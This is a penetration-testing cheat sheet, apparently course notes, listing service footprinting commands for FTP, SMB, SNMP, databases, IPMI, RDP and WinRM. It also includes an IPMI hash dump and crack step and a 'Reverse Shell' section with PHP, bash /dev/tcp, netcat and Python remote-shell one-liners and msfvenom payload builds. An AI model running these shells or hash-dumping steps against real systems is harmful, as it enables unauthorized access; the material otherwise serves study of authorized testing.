# 🕵️ Footprinting

This module covers many manual techniques that we can use for manual enumeration, footprinting, and interaction with a wide variety of services.

---

<details>
<summary><strong>🌐 Certificate Transparency + IP Resolution + Shodan</strong></summary>

Subdomain discovery via [crt.sh](https://crt.sh), followed by DNS resolution and Shodan fingerprinting.

```bash
# Initialize Shodan
shodan init <APIKEY>

# Extract subdomains from Certificate Transparency logs
curl -s "https://crt.sh/?q=<DOMAIN>&output=json" | jq -r '.[].name_value' | \
awk '{gsub(/\\n/,"\n")}1' | sort -u | grep -v "CN=" > subdomainlist.txt

# Resolve IPs for discovered subdomains
for i in $(cat subdomainlist.txt); do 
  host "$i" | grep "has address" | grep "<DOMAIN>" | cut -d" " -f4 >> ip-addresses.txt
done

# Perform Shodan footprinting
for i in $(cat ip-addresses.txt | sort -u); do 
  shodan host "$i"
done
```

</details>

---

<details>
<summary><strong>📶 CIDR Discovery Script</strong></summary>

**Identify IP ranges and scan for live hosts using a custom script**

### Key steps:
1. Validate input arguments
2. Identify CIDR block for a given IP
3. Ping all IPs in the range
4. Resolve IPs for a target domain
5. Support options and automation

**Script**: [`CIDR.sh`](../scripts/CIDR.sh)

 </details>
 
---

<details>
<summary><strong>📦 FTP</strong></summary>

**Scan FTP service**

```bash
sudo nmap -sV -p21 -sC -A <IP>
```

**Enumerate FTP settings and anonymously download files**

```bash
# Show configuration without comments
cat /etc/vsftpd.conf | grep -v "#"

# View restricted users
cat /etc/ftpusers

# Recursively download available FTP files
wget -m --no-passive ftp://<USER>:<PASSWORD>@<IP>
```

**Service interaction**

```bash
# nc
nc -nv <IP> <PORT>

# telnet
telnet <IP> <PORT>

# openssl
openssl s_client -connect <IP>:<PORT> -starttls ftp
```

 </details>

 ---

<details>
<summary><strong>📁 NFS</strong></summary>

**Scan NFS service**

```bash
sudo nmap <IP> -p111,2049 -sV -sC
```
```bash
sudo nmap --script nfs* <IP> -sV -p111,2049
```

**Service interaction**

Show Available NFS Shares
```bash
showmount -e <IP>
```

Mounting NFS Share
```bash
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

List Contents with Usernames, Group Names, UIDs & GUIDs
```bash
ls -l -n mnt/nfs/
```

Unmounting
```bash
sudo umount ./target-NFS
```

 </details>
 
---

<details>
<summary><strong>🧩 SMB</strong></summary>

**Scan SMB service**

```bash
sudo nmap <IP> -sV -sC -p139,445
```

**Analyze shared folders and user access**

```bash
# Check smb.conf (without comments and semicolons)
cat /etc/samba/smb.conf | grep -v "#\|\;"

# Restart Samba after changes
sudo systemctl restart smbd

# List available shares without credentials
smbclient -N -L //<IP>
```

### Tools:
- [`samrdump.py`](../scripts/samrdump.py)
- [SMBMap](https://github.com/ShawnDEvans/smbmap)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Enum4Linux-ng](https://github.com/cddmp/enum4linux-ng)

```bash
# Install Enum4Linux-ng
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
sudo cp enum4linux-ng.py /usr/local/bin/enum4linux-ng
sudo chmod +x /usr/local/bin/enum4linux-ng
enum4linux-ng -h
```

</details>
 
---

<details>
<summary><strong>📧 SMTP</strong></summary>

**Scan SMTP service**
```bash
sudo nmap <IP> -sC -sV -p25

sudo nmap <IP> -p25 --script smtp-open-relay -v
```

**Get configuration file**

```bash
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

**Service interaction**

```bash
telnet <IP> <PORT>
```

</details>

---

<details>
<summary><strong>📨 IMAP POP3</strong></summary>


**Scan SMTP service**
```bash
sudo nmap <IP> -sV -p 110,143,993,995 -sC --script pop3-capabilities,imap-capabilities
```

**Service interaction**

```bash
#curl
curl -k 'imaps://<IP>' --user <USER>:<PASSWORD>

#openssl pop3
openssl s_client -connect <IP>:pop3s

#openssl imap
openssl s_client -connect <IP>:imaps
```

</details>

---

<details>
<summary><strong>📡 SNMP</strong></summary>

**Footprinting SMTP service**

```bash
# snmpwalk
snmpwalk -v2c -c <COMMUNITYSTRING> <IP>

# OneSixtyOne
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

**Get configuration file**

```bash
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

</details>

---

<details>
<summary><strong>🛢️ MySQL</strong></summary>


**Scan MySQL service**

```bash
sudo nmap <IP> -sV -sC -p3306 --script mysql*
```

**Get configuration file**

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

**Service interaction**

```bash
# Without a password
mysql -u <USER> -h <IP>

# Using a password
mysql -u <USER> -p<PASSWORD> -h <IP>
```

</details>

---

<details>
<summary><strong>💾 MSSQL</strong></summary>


**Scan MSSQL service**

```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

**MSSQL Ping in Metasploit**

```bash
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts <IP>
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

**Service interaction**

**Script**: [`mssqlclient.py`](../scripts/mssqlclient.py)
```bash
python3 mssqlclient.py Administrator@<IP> -windows-auth
```

</details>

---

<details>
<summary><strong>🐚 Reverse Shell</strong></summary>


**PHP**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"); ?>
```

**BASH**
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
bash -i >& /dev/udp/<IP>/<PORT> 0>&1
```

**Netcat**
```bash
nc -e /bin/sh <IP> <PORT>
```

**Python**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Metasploit**
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

**Meterpreter**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

**Spawn TTY**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash"); import os; os.putenv("TERM", "xterm"); os.system("export SHELL=/bin/bash");'
export TERM=xterm
```

</details>

---

<details>
<summary><strong>🔐 SSH</strong></summary>


**Scan with SSH-Audit**
```bash
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py <IP>
```

**Get configuration file**
```bash
cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
```

**Service interaction**
```bash
ssh <USER>@<ip>

ssh -i id_rsa <USER>@<ip>
```

**Port Forwarding**
```bash
ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<IP>
```

</details>

---

<details>
<summary><strong>🧰 Oracle TNS</strong></summary>

**Scan TNS service**

```bash
sudo nmap -p1521 -sV <IP> --open

sudo nmap -p1521 -sV <IP> --open --script oracle-sid-brute

```

**Oracle-Tools**

Install Oracle-Tools*

[`Oracle-Tools-setup.sh`](../scripts/Oracle-Tools-setup.sh)

Testing ODAT

```bash
./odat.py all -s <IP>
```

**SQLplus Login**
```bash
sqlplus <USER>/<PASS>@<IP>/XE
sqlplus <USER>/<PASS>@<IP>/XE as sysdba
```

**Fix SQLplus Library Path**
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

**File Upload with Oracle**
```bash
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s <IP> -d XE -U user -P password --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**Download Uploaded File**
```bash
curl -X GET http://<IP>/testing.txt
```

</details>

---

<details>
<summary><strong>🖥️ IPMI</strong></summary>


**Scan with Nmap**
```bash
sudo nmap -sU --script ipmi-version -p 623 <IP>
```

**Scan with Metasploit**
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 > set rhosts <IP>
msf6 > show options
msf6 > run
```

**Dump Hashes**
```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 > set rhosts <IP>
msf6 > run
```

**Crack IPMI Hashes HP iLO using a factory default password**
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

</details>

---

<details>
<summary><strong>➡️ RDP</strong></summary>


**Scan with Nmap**
```bash
nmap -sV -sC -n <IP> -p3389 --disable-arp-ping --script rdp*
```

**RDP Security Check**

```bash
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl <IP>
```

**Service interaction**
```bash
xfreerdp /u:<USER> /p:"<PASSWORD>" /v:<IP>
```

</details>

---

<details>
<summary><strong>🔗 Windows Remote Management Protocols</strong></summary>

**WinRM**

**Scan with Nmap**
```bash
nmap -sV -sC <IP> -p5985,5986 --disable-arp-ping -n
```

**Service interaction**
```bash
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```


**Windows Management Instrumentation (WMI)**

**Footprinting the service**
```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py <USER>:"<PASSWORD>"@<IP> "hostname"
```

</details>

---

📘 **Next step:** Continue with [INFORMATION GATHERING](./02-information-gathering.md)
